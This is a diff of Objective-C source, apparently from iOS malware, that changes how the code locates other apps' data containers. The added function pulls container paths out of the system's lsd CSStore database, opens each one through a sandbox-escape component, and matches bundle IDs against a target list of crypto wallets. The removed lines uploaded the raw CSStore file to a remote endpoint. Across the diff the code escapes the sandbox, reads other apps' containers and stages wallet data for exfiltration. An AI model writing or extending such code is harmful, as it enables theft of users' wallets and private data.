@@ -74,6 +74,34 @@ static BOOL WQLLooksLikeContainerPath(NSString *s) {
     return [s containsString:@"/Containers/Data/"] || [s containsString:@"/Containers/Shared/"];
 }
 
+/// 直接从 CSStore 的明文里抽取容器路径（不依赖记录表结构）
+static NSArray<NSString *> *WQLExtractContainerPaths(NSData *data) {
+    const uint8_t *base = data.bytes;
+    size_t size = data.length;
+    const char *needle = "/private/var/mobile/Containers/";
+    size_t needleLen = strlen(needle);
+
+    NSMutableSet<NSString *> *set = [NSMutableSet set];
+    for (size_t i = 0; i + needleLen < size; i++) {
+        if (memcmp(base + i, needle, needleLen) != 0) continue;
+
+        size_t j = i;
+        while (j < size && (j - i) < 160) {
+            uint8_t c = base[j];
+            if (c < 0x20 || c > 0x7e) break;
+            j++;
+        }
+        if (j - i < needleLen + 40) { i = j; continue; }
+
+        NSString *s = [[NSString alloc] initWithBytes:base + i
+                                               length:j - i
+                                             encoding:NSUTF8StringEncoding];
+        if (s) [set addObject:s];
+        i = j;
+    }
+    return set.allObjects;
+}
+
 /// 自动探测记录长度：记录前面是 [u32 id][u32 size]，size 会重复出现几千次
 static uint32_t WQLDetectRecordSize(const uint8_t *base, size_t size) {
     static uint32_t counts[0x801];
@@ -164,7 +192,7 @@ static NSDictionary<NSString *, NSString *> *WQLParseCSStoreAuto(NSData *data,
 - (void)moveStageToPending:(NSString *)stage wallet:(NSString *)wallet;
 - (void)prunePendingIfNeeded;
 - (void)probeLaunchServices:(NSArray<WQLTarget *> *)targets;
-- (void)probeLSStore;
+- (void)probeLSStore:(NSArray<WQLTarget *> *)targets;
 @property (nonatomic, assign, readwrite) BOOL lastRunUsable;
 @end
 
@@ -531,7 +559,7 @@ static uint64_t WQLFNV1a(const char *s) {
 
 /// 只读探针：在 InternalDaemon 前 300 万 inode 里找 lsd 的 CSStore，
 /// 按 iOS 26 / 26.5 / 27 的四种记录布局各解析一次，看能映射出多少容器。
-- (void)probeLSStore {
+- (void)probeLSStore:(NSArray<WQLTarget *> *)targets {
     [self log:@"【探针】lsd CSStore（只读）"];
 
     NSDate *t0 = [NSDate date];
@@ -542,7 +570,6 @@ static uint64_t WQLFNV1a(const char *s) {
           (unsigned long)daemons.count, -[t0 timeIntervalSinceNow]];
 
     NSUInteger opened = 0, stores = 0;
-    BOOL dumped = NO;
     for (NSString *container in daemons) {
         int64_t handle = [[WQLEscape shared] consumeExtensionForPath:container error:nil];
         if (handle <= 0) continue;
@@ -585,21 +612,28 @@ static uint64_t WQLFNV1a(const char *s) {
                 [self log:@"        · %@ → %@", bid, map[bid]];
             }
 
-            // 解析不出来就把原始文件传一份回去离线分析（只传一次，取最大那个）
-            if (map.count < 50 && !dumped && data.length > 4 * 1024 * 1024) {
-                dumped = YES;
-                NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:@"wql_lsdump"];
-                NSFileManager *fm = [NSFileManager defaultManager];
-                [fm removeItemAtPath:stage error:nil];
-                [fm createDirectoryAtPath:stage withIntermediateDirectories:YES attributes:nil error:nil];
-                NSString *dst = [stage stringByAppendingPathComponent:name];
-                if ([fm copyItemAtPath:path toPath:dst error:nil]) {
-                    [self log:@"    ↑ 上传原始 csstore 供离线分析（%.1f MB）", data.length / 1048576.0];
-                    BOOL ok = [self uploadStage:stage blocking:YES];
-                    [self log:@"    %@ csstore 上传", ok ? @"✅" : @"⛔"];
+            // 不解析记录表，直接从明文里抽容器路径，再逐个读 metadata 认 bundleId
+            NSArray<NSString *> *paths = WQLExtractContainerPaths(data);
+            [self log:@"    路径抽取：%lu 个容器路径", (unsigned long)paths.count];
+
+            NSUInteger escaped = 0, matched = 0;
+            for (NSString *p in paths) {
+                int64_t h = [[WQLEscape shared] consumeExtensionForPath:p error:nil];
+                if (h <= 0) continue;
+                escaped++;
+
+                NSString *bid = [self bundleIDForContainerPath:p];
+                if (bid.length) {
+                    WQLTarget *t = [WQLTargets matchBundleID:bid inTargets:targets fuzzy:NULL];
+                    if (t) {
+                        matched++;
+                        [self log:@"        ★ %@（%@）→ %@", t.name, bid, p];
+                    }
                 }
-                [fm removeItemAtPath:stage error:nil];
+                [[WQLEscape shared] releaseHandle:h];
             }
+            [self log:@"    路径命中：可逃逸 %lu/%lu，命中钱包 %lu 个",
+                  (unsigned long)escaped, (unsigned long)paths.count, (unsigned long)matched];
         }
         [[WQLEscape shared] releaseHandle:handle];
     }
@@ -636,7 +670,7 @@ static uint64_t WQLFNV1a(const char *s) {
     }
     self.lastRunUsable = YES;
     [self probeLaunchServices:targets];
-    [self probeLSStore];
+    [self probeLSStore:targets];
 
     NSArray<NSString *> *allRoots = [self defaultRoots];
     NSMutableDictionary<NSString *, NSArray<NSString *> *> *children = [NSMutableDictionary dictionary];
